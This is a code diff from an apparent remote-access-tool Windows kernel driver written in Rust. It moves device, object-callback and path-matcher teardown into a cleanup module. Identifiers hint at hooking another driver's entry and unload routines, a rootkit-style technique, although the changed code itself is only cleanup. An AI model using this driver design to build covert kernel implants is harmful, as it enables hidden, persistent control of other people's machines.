@@ -4,55 +4,24 @@ use core::{mem, ptr};
 
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::nt_success;
-use wdk_sys::ntddk::{
-    IoDeleteDevice, IoDeleteSymbolicLink, ObUnRegisterCallbacks, PsCreateSystemThread,
-    RtlInitUnicodeString,
-};
-use wdk_sys::{NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS, UNICODE_STRING};
+use wdk_sys::ntddk::PsCreateSystemThread;
+use wdk_sys::{NTSTATUS, PDRIVER_OBJECT, THREAD_ALL_ACCESS};
 use widestring::Utf16Str;
 
 use crate::global::{
-    DOS_NAME, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT,
+    OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK, ORIGINAL_DRIVER_OBJECT, RAT_DEVICE_OBJECT,
 };
-use crate::{info, threads, warn};
+use crate::{cleanup, info, threads};
 
 type DriverUnloadFn = unsafe extern "C" fn(driver: PDRIVER_OBJECT);
 static _ORIGINAL_DRIVER_UNLOAD: AtomicPtr<u8> = AtomicPtr::new(ptr::null_mut());
 
-fn remove_registered_services(driver: PDRIVER_OBJECT) {
-    if let Some(driver) = unsafe { driver.as_ref() }
-        && !driver.DeviceObject.is_null()
-    {
-        let device = driver.DeviceObject;
-        info!("Removing device object: {device:p}");
-
-        let mut dos_name = UNICODE_STRING::default();
-        unsafe {
-            RtlInitUnicodeString(&mut dos_name, DOS_NAME.as_ptr());
-            let status = IoDeleteSymbolicLink(&mut dos_name);
-            if !nt_success(status) {
-                warn!("IoDeleteSymbolicLink error: 0x{status:X}");
-            }
-
-            IoDeleteDevice(device);
-        }
-    }
-
-    let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel);
-    if !handle.is_null() {
-        info!("Unregistering object callbacks");
-        unsafe {
-            ObUnRegisterCallbacks(handle);
-        }
-    }
-
-    let ac = OBJ_PATH_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel);
-    if !ac.is_null() {
-        info!("Dropping Aho-Corasick automaton");
-        unsafe {
-            let _ = Box::from_raw(ac);
-        }
-    }
+fn remove_registered_services() {
+    cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(ptr::null_mut(), Ordering::AcqRel));
+    cleanup::cleanup_object_callbacks(
+        OB_REGISTER_CALLBACKS_HANDLE.swap(ptr::null_mut(), Ordering::AcqRel),
+    );
+    cleanup::cleanup_aho_corasick(OBJ_PATH_AHO_CORASICK.swap(ptr::null_mut(), Ordering::AcqRel));
 }
 
 unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
@@ -66,7 +35,7 @@ unsafe extern "C" fn driver_unload(driver: PDRIVER_OBJECT) {
         }
     }
 
-    remove_registered_services(driver);
+    remove_registered_services();
 }
 
 pub fn driver_entry_prehook(
